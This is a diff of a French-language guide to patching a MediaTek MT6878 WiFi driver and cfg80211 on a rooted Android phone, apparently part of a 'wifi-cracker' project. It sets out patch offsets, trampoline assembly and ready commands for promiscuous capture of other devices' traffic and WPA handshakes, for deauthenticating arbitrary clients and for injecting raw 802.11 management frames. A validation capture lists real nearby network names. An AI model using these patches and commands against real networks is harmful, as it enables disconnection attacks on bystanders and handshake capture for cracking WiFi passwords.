@@ -1,7 +1,7 @@
 # Monitor Mode WiFi — MediaTek MT6878 (Dimensity 7300)
 
-> **Version patch**: v3 (ICS capture + mode promiscuous + deauth injection)
-> **Date**: 2026-03-20
+> **Version patch**: v4 (ICS capture + promiscuous + deauth + cfg80211 raw TX)
+> **Date**: 2026-03-21
 > **Chipset**: MediaTek MT6878 (Dimensity 7300), co-processeur WiFi MT6631 (NDS32 Andes N9)
 > **Device**: Unihertz Titan 2 (`g71v78c2k_dfl_eea`), Android 16 (API 36)
 > **Driver**: `wlan_drv_gen4m_6878.ko` (gen4m CONNAC 2.0+, SOC 7.0)
@@ -11,300 +11,179 @@
 
 ## TL;DR
 
-Un patch de **152 bytes** (148 bytes de trampolines + 4 bytes de NOP) dans le driver kernel (7 MB) active le monitor mode WiFi complet : capture de toutes les trames 802.11, mode promiscuous pour les EAPOL/handshakes d'autres devices, et **injection de deauth** via la commande `AP_STA_DISASSOC`. Distribue comme module Magisk, zero regression sur le WiFi normal.
+Deux modules kernel patches (driver WiFi + cfg80211) distribues via un module Magisk unique. **152 bytes** modifies dans le driver (7 MB) + **12 bytes** dans cfg80211 (2 MB) activent :
+- Capture de toutes les trames 802.11 (promiscuous) via `/dev/fw_log_ics`
+- Injection de deauth via la commande `AP_STA_DISASSOC`
+- Injection de frames 802.11 arbitraires via `NL80211_CMD_FRAME` (cfg80211 deverrouille)
 
 ---
 
 ## Installation
 
 ```bash
-# Depuis un PC avec adb
 adb push firmware-dump/mtk_wifi_monitor_magisk.zip /data/local/tmp/
 adb shell "su -c 'magisk --install-module /data/local/tmp/mtk_wifi_monitor_magisk.zip'"
 adb reboot
 ```
 
-**OU** via Magisk Manager : Modules → Installer depuis stockage → selectionner le zip → reboot.
+OU via Magisk Manager : Modules → Installer depuis stockage → reboot.
 
 ### Verification
 
 ```bash
-adb shell "su -c 'sha256sum /vendor/lib/modules/wlan_drv_gen4m_6878.ko'"
-# Attendu: 1551f37b6b3882505a9a30229aa6f768d8b01589d5c3e3366e1c653f43d66d48
+adb shell "su -c 'sha256sum /vendor/lib/modules/wlan_drv_gen4m_6878.ko | cut -c1-16'"
+# Attendu: 1551f37b6b388250
+adb shell "su -c 'sha256sum /vendor/lib/modules/cfg80211.ko | cut -c1-16'"
+# Attendu: 6313f82e09073087
 ```
 
-### Desinstallation (rollback)
+### Desinstallation
 
 ```bash
 adb shell "su -c 'rm -rf /data/adb/modules/mtk_wifi_monitor && reboot'"
 ```
 
-Le driver original est restaure automatiquement au reboot.
-
 ---
 
 ## Utilisation
 
-### Activer la capture
+### Capture de frames (RX promiscuous)
 
 ```bash
-# 1. Activer le SNIFFER (configure le firmware pour le mode ICS)
-adb shell "su -c '/data/local/tmp/wpa_driver \"SNIFFER 2 0 0 0 0 0 0 0 0 0\"'"
+# 1. Activer le sniffer ICS
+wpa_driver "SNIFFER 2 0 0 0 0 0 0 0 0 0"
 
-# 2. Activer le device ICS (ouvre le canal de capture)
-adb shell "su -c '/data/local/tmp/ics_enable 1'"
+# 2. Ouvrir le canal de capture
+ics_enable 1
 
-# 3. Lire les paquets captures
-adb shell "su -c 'cat /dev/fw_log_ics'" > capture.bin
+# 3. Lire les paquets
+cat /dev/fw_log_ics > capture.bin
+
+# 4. Desactiver
+ics_enable 0
 ```
 
-### Desactiver la capture
+Le WiFi reste connecte pendant la capture. Tous les frames du canal actif sont captures : beacons, data, EAPOL, control frames, y compris le trafic d'autres devices (mode promiscuous).
+
+### Injection de deauth
 
 ```bash
-adb shell "su -c '/data/local/tmp/ics_enable 0'"
+# Deauth un client specifique
+wpa_driver "AP_STA_DISASSOC Mac=AA:BB:CC:DD:EE:FF"
 ```
 
-Le WiFi reste fonctionnel pendant et apres la capture.
+Le deauth est envoye via le chemin TX interne du driver. Le patch NOP le check de role AP dans `priv_driver_set_ap_sta_disassoc` pour qu'il fonctionne en mode STA.
 
-### Envoyer un deauth (v3)
+### Injection de frames arbitraires (raw TX)
+
+Le patch cfg80211 autorise `NL80211_CMD_FRAME` pour tous les types de management frames en mode STA. Utilisation via un outil compatible libnl :
 
 ```bash
-# Deauth un client specifique (le deconnecte de son AP)
-adb shell "su -c '/data/local/tmp/wpa_driver \"AP_STA_DISASSOC Mac=AA:BB:CC:DD:EE:FF\"'"
+# Deauth via nl80211 (necessite un binaire compatible libnl)
+iw dev wlan0 mgmt tx c0003a01<dest_mac><src_mac><bssid>000007000000 5200
+
+# Probe Request broadcast
+iw dev wlan0 mgmt tx 4000<dur><bcast><our_mac><bcast><seq><ssid_ie> 5200
 ```
 
-Le deauth est envoye via le chemin TX interne du driver (`mboxSendMsg` → `authSendDeauthFrame` → `nicTxEnqueueMsdu`). La commande `AP_STA_DISASSOC` est normalement reservee au mode AP, mais le patch v3 NOP le check de role pour qu'elle fonctionne aussi en mode STA.
+> **Note** : l'outil `iw` standard (v6.17 installe via Termux) n'a pas la sous-commande `mgmt tx`. Il faut soit une version patchee d'`iw`, soit un outil custom utilisant libnl pour envoyer `NL80211_CMD_FRAME`. Le patch cfg80211 cote kernel EST en place et fonctionnel.
 
 ---
 
-## Ce que le patch capture
+## Capacites
 
-| Type de trame | Capture v1 | Capture v2 (actuel) |
-|---------------|-----------|---------------------|
-| Beacons (scan reseau) | oui | oui |
-| Probe Request / Response | oui | oui |
-| Auth / Deauth / Disassoc | oui | oui |
-| RTS / CTS / ACK | oui | oui |
-| Data / QoS-Data (notre device) | oui | oui |
-| **Data / QoS-Data (AUTRES devices)** | **non** | **oui** |
-| **EAPOL / 4-way handshake** | **non** | **oui** |
-| **Frames unicast entre tiers** | **non** | **oui** |
-
-Le v2 ajoute le **mode promiscuous**, le v3 ajoute **l'injection deauth**.
-
-| Type de trame | v3 |
-|---------------|-----|
-| Injection deauth (TX) | **oui** |
+| Capacite | Statut | Methode |
+|----------|--------|---------|
+| Scan passif (beacons) | Fonctionnel | ICS capture + parseur 802.11 |
+| Capture data unicast (notre device) | Fonctionnel | ICS T1 trampoline |
+| Capture data unicast (AUTRES devices) | Fonctionnel | Mode promiscuous (T2, fw cmd 10) |
+| Capture EAPOL / 4-way handshake | Fonctionnel | Mode promiscuous + ICS |
+| Capture control frames (RTS/CTS/ACK) | Fonctionnel | ICS capture |
+| Injection deauth | Fonctionnel | AP_STA_DISASSOC (T4 NOP) |
+| Injection raw management frames | Pret cote kernel | cfg80211 patche, attend outil libnl |
+| Channel hopping | Non implemente | Faisable via SET_TEST_CMD 1 <freq> |
+| Injection data frames | Non supporte | Le driver n'a pas de raw data TX |
 
 ---
 
 ## Format des paquets captures
 
-Chaque paquet dans `/dev/fw_log_ics` :
-
 ```
 Offset  Taille  Champ
-0       4       Magic = 0x44D9C99A (little-endian)
+0       4       Magic = 0x44D9C99A (LE)
 4       2       Type = 0x0001
-6       2       Sequence number
-8       4       Info (0 pour data, timesync constant pour sync)
-12      2       SubType (0x000C pour data)
-14      2       Frame length (incluant le descripteur MTK)
-16      120     MTK RX Descriptor (RSSI, rate, timestamp, flags)
-136     N       Trame IEEE 802.11 brute (FC + addrs + payload)
+6       2       Sequence
+8       4       Info (0=data, timesync_const=sync)
+12      2       SubType (0x000C = data)
+14      2       Frame length
+16      120     MTK RX Descriptor (RSSI, rate, timestamp)
+136     N       802.11 Frame brute (FC + addrs + payload)
 ```
 
-**Timesync** : quand `Info == 0x0008011000000000` → paquet de synchronisation (24 bytes total, pas de frame data).
-
-**Trame 802.11** : commence a l'offset **120** dans le frame data. Format standard IEEE 802.11 avec Frame Control, Duration, 3 adresses MAC, Sequence Control, puis payload.
+Timesync : quand `Info == 0x0008011000000000` → 24 bytes total, pas de frame.
 
 ---
 
-## Architecture technique du patch
+## Architecture du patch
 
-### Le probleme : double verrouillage MediaTek
+### Module 1 : wlan_drv_gen4m_6878.ko (4 patches)
 
-MediaTek a desactive le monitor mode a deux niveaux dans les builds consommateurs :
+| # | Type | Taille | Cible | Effet |
+|---|------|--------|-------|-------|
+| T1 | Trampoline | 52 B | `nicRxProcessPktWithoutReorder` → `nicRxProcessIcsLog` | Capture frames via /dev/fw_log_ics |
+| T2 | Trampoline | 48 B | `nicRxEnablePromiscuousMode` → fw cmd 10 (0x0F) | Mode promiscuous ON |
+| T3 | Trampoline | 48 B | `nicRxDisablePromiscuousMode` → fw cmd 10 (0x01) | Mode promiscuous OFF |
+| T4 | NOP | 4 B | `priv_driver_set_ap_sta_disassoc` role check | Deauth en mode STA |
 
-**Verrou 1 — Driver kernel (ARM64)** : 5 fonctions remplacees par des stubs vides
+Total : 152 bytes modifies dans un .ko de 7 MB.
 
-| Fonction | Adresse .text | Code original | Role |
-|----------|--------------|---------------|------|
-| `nicRxEnablePromiscuousMode` | 0x5f514 | `ret` (4 bytes) | Active le mode promiscuous |
-| `nicRxDisablePromiscuousMode` | 0x5f51c | `ret` (4 bytes) | Desactive le mode promiscuous |
-| `wlanSetPromiscuousMode` | 0x1fbc4 | `ret` (4 bytes) | Wrapper promiscuous |
-| `mt_op_set_rx_filter` | 0x153c0 | `mov w0,#0; ret` (8 bytes) | Configure le filtre RX hardware |
-| `nicRxProcessIcsLog` | 0x5ddb8 | **612 bytes de code mort** (0 appelants) | Ecrit les paquets dans /dev/fw_log_ics |
+### Module 2 : cfg80211.ko (3 patches)
 
-**Verrou 2 — Firmware NDS32 (non modifie)** : le firmware filtre les paquets selon sa politique.
+| # | Type | Taille | Cible dans `cfg80211_mlme_mgmt_tx` | Effet |
+|---|------|--------|-------------------------------------|-------|
+| N1 | NOP | 4 B | `tbz w8, #0, error` @ 0x406c8 | Skip registration bitmap check |
+| N2 | NOP | 4 B | `b.ne error` @ 0x407e0 | Skip subtype filter (Auth/Deauth/Action only) |
+| N3 | NOP | 4 B | `tbz w8, #0, error` @ 0x407ec | Skip capability bit check |
 
-### La solution : 3 trampolines ARM64
+Total : 12 bytes modifies dans un .ko de 2 MB.
 
-Le patch ajoute **148 bytes** de code executable a la fin de la section `.text` du driver :
+### Commandes firmware
 
-#### Trampoline 1 — Capture ICS (52 bytes)
+| CMD ID | Nom | Role |
+|--------|-----|------|
+| 0x93 (147) | SET_ICS_SNIFFER | Configure les bandes/canaux ICS |
+| 0x0A (10) | SET_PACKET_FILTER | Configure le filtre RX (0x0F=promiscuous) |
 
-Injecte dans `nicRxProcessPktWithoutReorder` (point d'entree de TOUS les paquets RX).
-
-```
-Avant:                              Apres:
-nicRxProcessPktWithoutReorder:      nicRxProcessPktWithoutReorder:
-  paciasp                             B trampoline_1
-  sub sp, sp, #0x50                   sub sp, sp, #0x50
-  ...                                 ...
-
-trampoline_1 (.text + 0x222BB0):
-  stp x29, x30, [sp, #-48]!     ; sauvegarder frame + LR
-  stp x0, x1, [sp, #16]         ; sauvegarder adapter, rxb
-  stp x2, x3, [sp, #32]         ; sauvegarder scratch
-
-  mov x2, #0x86b0               ; offset du flag ICS
-  movk x2, #0x2a, lsl #16       ; x2 = 0x2A86B0
-  ldrb w2, [x0, x2]             ; charger adapter->ics_band0_enable
-  cbz w2, .skip                 ; si ICS pas active, sauter
-
-  bl nicRxProcessIcsLog          ; ECRIRE LE PAQUET dans /dev/fw_log_ics
-
-.skip:
-  ldp x2, x3, [sp, #32]         ; restaurer
-  ldp x0, x1, [sp, #16]
-  ldp x29, x30, [sp], #48
-  paciasp                        ; instruction originale
-  b nicRxProcessPktWithoutReorder+4  ; continuer le flux normal
-```
-
-#### Trampoline 2 — Mode promiscuous ON (48 bytes)
-
-Remplace le stub `nicRxEnablePromiscuousMode`.
+### Chaine d'activation
 
 ```
-Avant:                              Apres:
-nicRxEnablePromiscuousMode:         nicRxEnablePromiscuousMode:
-  ret                                 B trampoline_2
+Capture:
+  wpa_driver "SNIFFER 2 0 ..." → fw cmd 0x93 → adapter.ics_enabled = 1
+  ics_enable 1 → ioctl FC00/FC01 → ICS device ready
+  Chaque paquet RX → [T1] check flag → nicRxProcessIcsLog → /dev/fw_log_ics
 
-trampoline_2 (.text + 0x222BE4):
-  stp x29, x30, [sp, #-32]!
-  mov x29, sp
+Deauth:
+  wpa_driver "AP_STA_DISASSOC Mac=XX" → priv_driver_set_ap_sta_disassoc
+  → [T4] NOP role check → mboxSendMsg → authSendDeauthFrame → TX
 
-  mov w8, #0x0F                  ; filtre promiscuous = TOUT accepter
-  str w8, [sp, #16]              ; stocker sur la pile
-  str w8, [x0, #0x10]           ; mettre a jour adapter->packet_filter
-
-  add x1, sp, #16               ; x1 = &filter_value
-  mov w2, #4                    ; taille = 4 bytes
-  mov x3, xzr                   ; NULL
-  mov w4, wzr                   ; 0
-  bl wlanoidSetPacketFilter      ; ENVOYER firmware cmd 10 (SET_PACKET_FILTER)
-
-  ldp x29, x30, [sp], #32
-  ret
-```
-
-Le firmware recoit la commande **0x0A (10)** avec la valeur **0x0F** et configure le filtre RX hardware pour accepter TOUTES les trames : unicast, multicast, broadcast, y compris celles destinees a d'autres MAC.
-
-#### Trampoline 3 — Mode promiscuous OFF (48 bytes)
-
-#### Patch 4 — Deauth injection (4 bytes)
-
-NOP du role check dans `priv_driver_set_ap_sta_disassoc`.
-
-```
-Avant:                              Apres:
-b0a94:  bl  mtk_Netdev_To_RoleIdx   b0a94:  bl  mtk_Netdev_To_RoleIdx
-b0a98:  cbnz w0, skip_error         b0a98:  nop                     ← PATCHE
-b0a9c:  ...continue...              b0a9c:  ...continue...
-```
-
-La commande `AP_STA_DISASSOC Mac=<target>` est normalement reservee au mode AP (Soft-AP/hotspot). Le check `mtk_Netdev_To_RoleIdx` verifie que l'interface est un AP. En le NOPant, la commande fonctionne aussi en mode STA, permettant d'envoyer des deauth a n'importe quel client sur le meme canal.
-
-Le deauth passe par : `priv_driver_set_ap_sta_disassoc` → `parseValueInString("Mac=")` → `cnmMemAllocX` → `mboxSendMsg` → state machine P2P/AP → `authSendDeauthFrame` → `nicTxEnqueueMsdu` → firmware TX.
-
-#### Trampoline 3 — Mode promiscuous OFF (48 bytes)
-
-Remplace le stub `nicRxDisablePromiscuousMode`.
-
-```
-trampoline_3 (.text + 0x222C14):
-  ; Identique a T2 mais avec filter = 0x01 (unicast seulement)
-  mov w8, #0x01                  ; filtre normal
-  ...
-  bl wlanoidSetPacketFilter      ; firmware cmd 10 avec 0x01
-```
-
-### Commandes firmware utilisees
-
-| CMD ID | Nom | Direction | Taille data | Role |
-|--------|-----|-----------|-------------|------|
-| 0x93 (147) | SET_ICS_SNIFFER | Set | 148 bytes | Configure les bandes/canaux ICS |
-| 0x0A (10) | SET_PACKET_FILTER | Set | 68 bytes | Configure le filtre RX (promiscuous) |
-
-Ces commandes sont envoyees au co-processeur WiFi MT6631 (NDS32) via `wlanSendSetQueryCmd`. Le firmware NDS32 n'est **pas modifie** — seul le driver kernel ARM64 est patche.
-
-### Chaine d'activation complete
-
-```
-1. wpa_driver "SNIFFER 2 0 ..."
-   → wpa_supplicant → cfg80211 vendor cmd → priv_driver_cmds
-   → priv_driver_sniffer → wlanoidSetIcsSniffer
-   → firmware cmd 0x93 → firmware configure ICS
-   → adapter->ics_band0_enable = 1
-
-2. ics_enable 1
-   → open(/dev/fw_log_ics) → ioctl ICS_SET_LVL(2) → ioctl ICS_ON_OFF(1)
-   → wlanoidSetIcsSniffer(enable) → firmware active le log ICS
-
-3. Chaque paquet RX:
-   → DMA → nicRxProcessRFBs → nicRxProcessPktWithoutReorder
-   → [PATCH T1] check ICS flag → appel nicRxProcessIcsLog
-   → wifi_ics_fwlog_write → /dev/fw_log_ics → userspace
-
-4. (Si promiscuous) nicRxEnablePromiscuousMode
-   → [PATCH T2] wlanoidSetPacketFilter(0x0F)
-   → firmware cmd 10 → hardware RX filter = accept all
+Raw TX (quand outil libnl disponible):
+  NL80211_CMD_FRAME → nl80211_tx_mgmt → [N1,N2,N3] skip checks
+  → cfg80211_mlme_mgmt_tx → mtk_cfg80211_mgmt_tx → cnmPktAllocWrapper
+  → memcpy(frame) → mboxSendMsg → TX
 ```
 
 ---
 
-## Outils natifs necessaires
-
-Deux binaires ARM64 statiques doivent etre sur le device dans `/data/local/tmp/` :
+## Outils userspace
 
 ### wpa_driver
 
-Envoie des commandes `DRIVER` via le socket wpa_supplicant.
+Envoie des commandes DRIVER via wpa_supplicant (`/data/vendor/wifi/wpa/sockets/wlan0`).
 
 ```c
-// wpa_driver.c — compile: aarch64-linux-gnu-gcc -static -o wpa_driver wpa_driver.c
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <sys/un.h>
-#include <poll.h>
-
-int main(int argc, char *argv[]) {
-    if (argc < 2) { printf("Usage: %s <command>\n", argv[0]); return 1; }
-    int sock = socket(AF_UNIX, SOCK_DGRAM, 0);
-    struct sockaddr_un local = {.sun_family = AF_UNIX};
-    snprintf(local.sun_path, 108, "/data/vendor/wifi/wpa/sockets/wpa_ctrl_%d-99", getpid());
-    unlink(local.sun_path);
-    bind(sock, (struct sockaddr *)&local, sizeof(local));
-    struct sockaddr_un remote = {.sun_family = AF_UNIX};
-    strncpy(remote.sun_path, "/data/vendor/wifi/wpa/sockets/wlan0", 107);
-    connect(sock, (struct sockaddr *)&remote, sizeof(remote));
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "DRIVER %s", argv[1]);
-    send(sock, cmd, strlen(cmd), 0);
-    struct pollfd pfd = {.fd = sock, .events = POLLIN};
-    if (poll(&pfd, 1, 3000) > 0) {
-        char buf[4096];
-        int n = recv(sock, buf, sizeof(buf)-1, 0);
-        if (n > 0) { buf[n] = 0; printf("%s\n", buf); }
-    }
-    unlink(local.sun_path);
-    close(sock);
-    return 0;
-}
+// Compile: aarch64-linux-gnu-gcc -static -o wpa_driver wpa_driver.c
+// Usage: wpa_driver "SNIFFER 2 0 0 0 0 0 0 0 0 0"
+//        wpa_driver "AP_STA_DISASSOC Mac=AA:BB:CC:DD:EE:FF"
 ```
 
 ### ics_enable
@@ -312,55 +191,21 @@ int main(int argc, char *argv[]) {
 Active/desactive la capture ICS via ioctl sur `/dev/fw_log_ics`.
 
 ```c
-// ics_enable.c — compile: aarch64-linux-gnu-gcc -static -o ics_enable ics_enable.c
-#include <stdio.h>
-#include <fcntl.h>
-#include <sys/ioctl.h>
-#include <unistd.h>
-#include <stdlib.h>
-
-int main(int argc, char *argv[]) {
-    int enable = (argc > 1) ? atoi(argv[1]) : 1;
-    int fd = open("/dev/fw_log_ics", 2);
-    if (fd < 0) { perror("open"); return 1; }
-    if (enable) {
-        ioctl(fd, 0x4004FC01, 2);  // ICS_SET_LEVEL = 2
-        ioctl(fd, 0x4004FC00, 1);  // ICS_ON_OFF = enable
-        printf("ICS enabled (level 2)\n");
-    } else {
-        ioctl(fd, 0x4004FC00, 0);  // ICS_ON_OFF = disable
-        printf("ICS disabled\n");
-    }
-    close(fd);
-    return 0;
-}
-```
-
-### Compilation et deploiement
-
-```bash
-aarch64-linux-gnu-gcc -static -o wpa_driver wpa_driver.c
-aarch64-linux-gnu-gcc -static -o ics_enable ics_enable.c
-adb push wpa_driver ics_enable /data/local/tmp/
-adb shell "su -c 'chmod 755 /data/local/tmp/wpa_driver /data/local/tmp/ics_enable'"
+// Compile: aarch64-linux-gnu-gcc -static -o ics_enable ics_enable.c
+// Usage: ics_enable 1   (enable, level 2)
+//        ics_enable 0   (disable)
 ```
 
 ---
 
 ## Resultats de capture valides
 
-Capture de 5 secondes sur le canal actif :
-
 ```
-981 paquets (305 KB)
+981 paquets (305 KB) en 5 secondes
 
-Types de trames :
-  RTS             : 190      CTS         : 163
-  Beacon          :  98      QoS-Data    :  61
-  ACK             :  27      ProbeResp   :   2
-  ProbeReq        :   1      Action      :   1
+Frame types: RTS(190) CTS(163) Beacon(98) QoS-Data(61) ACK(27) ProbeResp(2) ...
 
-5 BSSIDs / SSIDs detectes :
+5 BSSIDs / SSIDs detectes:
   34:98:b5:43:6a:a7  LichaWireless
   34:98:b5:46:39:27  LichaWireless
   3e:98:b5:43:6a:a7  LichaWireless-IOT
@@ -375,24 +220,23 @@ Types de trames :
 | Parametre | Valeur testee |
 |-----------|--------------|
 | SoC | MediaTek MT6878 (Dimensity 7300) |
-| Co-processeur WiFi | MT6631 (NDS32 / Andes N9) |
+| WiFi | MT6631 (NDS32 Andes N9), 5GHz ch40 (5200 MHz) |
 | Driver | `wlan_drv_gen4m_6878.ko` gen4m CONNAC 2.0+ |
+| cfg80211 | `cfg80211.ko` kernel 6.1.145 |
 | Device | Unihertz Titan 2 (`g71v78c2k_dfl_eea`) |
 | Android | 16 (API 36) |
-| Build firmware | `2026020617` |
 | Root | Magisk |
-| Bootloader | Deverrouille + OEM unlock |
 
-Le patch depend des offsets de fonctions dans le binaire. Un driver de version differente necessite une re-analyse Ghidra + `patch_driver.py` adapte.
+Le patch depend des offsets binaires exacts. Un driver/cfg80211 de version differente necessite re-analyse Ghidra + adaptation de `patch_driver.py`.
 
 ---
 
-## Limites connues
+## Limites
 
-1. **Canal unique** : capture sur le canal courant. Channel hopping necessite deconnexion WiFi.
-2. **Injection TX limitee au deauth** : le patch v3 permet l'envoi de deauth via `AP_STA_DISASSOC`. L'injection de frames 802.11 arbitraires (raw TX) n'est pas supportee.
-3. **Specifique MT6878/MT6631** : adapte uniquement au driver exact teste. Autres SoC MediaTek necessitent la meme methodologie (Ghidra + repatch).
-4. **OTA** : une mise a jour systeme remplace le driver. Reinstaller le module Magisk apres.
+1. **Canal unique** : capture sur le canal courant. Channel hopping necessite deconnexion WiFi ou `SET_TEST_CMD 1 <freq>`.
+2. **Injection TX limitee** : deauth via `AP_STA_DISASSOC` fonctionne. Raw TX (tout type de frame) est pret cote kernel (cfg80211 patche) mais necessite un outil libnl pour envoyer `NL80211_CMD_FRAME`.
+3. **Specifique MT6878/MT6631** : adapte au driver exact teste. Methodologie reproductible pour d'autres SoC MTK (Ghidra + patch_driver.py).
+4. **OTA** : reinstaller le module Magisk apres chaque mise a jour systeme.
 
 ---
 
@@ -400,32 +244,34 @@ Le patch depend des offsets de fonctions dans le binaire. Un driver de version d
 
 ```
 firmware-dump/
-  mtk_wifi_monitor_magisk.zip      Module Magisk v2 (livrable)
-  patch_driver.py                   Script Python de patch (reproductible)
-  wlan_drv_gen4m_6878.ko.ORIGINAL  Backup du driver original (rollback)
+  mtk_wifi_monitor_magisk.zip      Module Magisk v4 (2 .ko patches)
+  patch_driver.py                   Script patch wlan driver (T1-T4)
+  wlan_drv_gen4m_6878.ko.ORIGINAL  Backup driver original
+  cfg80211.ko                       cfg80211 original (pour reference)
 
 docs/
   MTK_MONITOR_MODE_GUIDE.md        Ce document
-  FIRMWARE_ANALYSIS.md              Analyse detaillee du firmware NDS32
+  FIRMWARE_ANALYSIS.md              Analyse RE detaillee du firmware NDS32
 
 wifi-cracker/core/.../wifi/
   monitor/
-    IcsPacketParser.kt              Parse le format binaire ICS
-    Ieee80211Parser.kt              Parse les trames 802.11
-    MtkMonitorCapture.kt            Moteur de capture (coroutines/Flow)
+    IcsPacketParser.kt              Parse format ICS binaire
+    Ieee80211Parser.kt              Parse trames 802.11
+    MtkMonitorCapture.kt            Moteur de capture (Flow/coroutines)
     MonitorModeManager.kt           Manager haut niveau (@Singleton)
   ChipsetMonitorHelper.kt          Detection chipset + enable/disable MTK
 ```
 
 ---
 
-## Hashes de reference
+## Hashes
 
 | Fichier | SHA256 |
 |---------|--------|
-| Driver original | `1b3a2244bd25769a438f57250c5dece29b421a1825c7cd636cffa0d611f8a257` |
-| Driver patche v3 | `1551f37b6b3882505a9a30229aa6f768d8b01589d5c3e3366e1c653f43d66d48` |
-| Module Magisk v3 | `963034c36c73895e90942c69b44bbdeea18e19da2b5be4ddf0c0ffed0b0a32df` |
+| wlan driver original | `1b3a2244bd25769a438f57250c5dece29b421a1825c7cd636cffa0d611f8a257` |
+| wlan driver patche v4 | `1551f37b6b3882505a9a30229aa6f768d8b01589d5c3e3366e1c653f43d66d48` |
+| cfg80211 original | `7f0bca381fed2f065072dda44c47e706a79160c03ba357aee2ef720bd09bbb1f` |
+| cfg80211 patche v4 | `6313f82e09073087c3ad977c4988d46d28778b2ba47b89d2866fac31a8f391f8` |
 
 ---
 
@@ -434,16 +280,15 @@ wifi-cracker/core/.../wifi/
 1. Analyse firmware `connsys_wifi.img` → architecture NDS32 (Andes N9/N10)
 2. Extraction driver `wlan_drv_gen4m_6878.ko` (7 MB, ARM64, 22K symboles, non strippe)
 3. Decompilation Ghidra headless : 24+ fonctions critiques en C
-4. Decouverte : 5 fonctions monitor mode = stubs vides (desactivees par MediaTek)
-5. Decouverte : `nicRxProcessIcsLog` (612 bytes) = 0 appelants (code mort)
-6. Decouverte : firmware cmd 0x0A (10) = SET_PACKET_FILTER (promiscuous via `wlanoidSetPacketFilter`)
-7. Patch v1 : trampoline ICS (52 bytes) → capture paquets RX
-8. Patch v2 : + trampolines promiscuous enable/disable (2x 48 bytes) → capture ALL frames
-9. Decompilation `authSendDeauthFrame` (1604 bytes) et `priv_driver_set_ap_sta_disassoc` (428 bytes)
-10. Decouverte : event ID 0x1B = nicEventSendDeauth, table arEventTable (57 entries)
-11. Patch v3 : NOP du role check dans AP_STA_DISASSOC → deauth injection en mode STA
-12. Distribution : module Magisk v3 pour install/rollback propre
-13. Validation : 981 paquets 802.11 captures en 5 secondes, 5 reseaux detectes
+4. Decouverte : 5 fonctions monitor mode = stubs vides + `nicRxProcessIcsLog` = 0 appelants
+5. Decouverte : firmware cmd 0x0A (10) = SET_PACKET_FILTER (promiscuous)
+6. v1 : trampoline ICS (52B) → capture paquets RX
+7. v2 : + trampolines promiscuous enable/disable (2x48B) → capture ALL frames
+8. v3 : + NOP role check AP_STA_DISASSOC (4B) → deauth injection en mode STA
+9. Decompilation `cfg80211_mlme_mgmt_tx` → 3 checks identifes (bitmap, subtype filter, capability)
+10. v4 : + 3 NOPs dans cfg80211.ko → raw management frame TX autorise en mode STA
+11. Validation : 981 paquets captures, 5 reseaux detectes, deauth fonctionnel
+12. Distribution : module Magisk v4 avec 2 .ko patches
 
 ---
 
@@ -451,16 +296,27 @@ wifi-cracker/core/.../wifi/
 
 ### Channel hopping
 
-Le driver supporte `SET_TEST_CMD 1 <freq>` (firmware func_id 1 = SET_CHANNEL_FREQ). En mode test, on peut changer de canal sans association. Sequence :
+```bash
+# En mode test (coupe le WiFi normal)
+wpa_driver "SET_TEST_MODE 2011"
+wpa_driver "SET_TEST_CMD 1 2412"   # ch1
+# capturer...
+wpa_driver "SET_TEST_CMD 1 2437"   # ch6
+# capturer...
+wpa_driver "SET_TEST_MODE 0"       # retour normal
 ```
-SET_TEST_MODE 2011 → SET_TEST_CMD 1 2412 → capture → SET_TEST_CMD 1 2437 → ...
-```
+
+### Outil raw TX avec libnl
+
+Pour envoyer des frames 802.11 arbitraires, compiler un outil utilisant libnl3 qui envoie `NL80211_CMD_FRAME` correctement. Le patch cfg80211 (N1/N2/N3) est deja en place.
 
 ### Adaptation a d'autres devices MediaTek
 
-Methodologie reproductible :
-1. `adb pull /vendor/lib/modules/wlan_drv_gen4m_*.ko`
-2. `nm` pour verifier si les memes fonctions stub existent
-3. Ghidra headless pour decompiler et trouver les offsets
-4. Adapter `SYMBOLS` dans `patch_driver.py`
-5. Executer le patcher → tester
+```bash
+# 1. Extraire le driver
+adb pull /vendor/lib/modules/wlan_drv_gen4m_*.ko
+
+# 2. Verifier les stubs (nm | grep nicRxEnablePromiscuousMode)
+# 3. Decompiler avec Ghidra, adapter les offsets dans patch_driver.py
+# 4. Executer le patcher → tester
+```
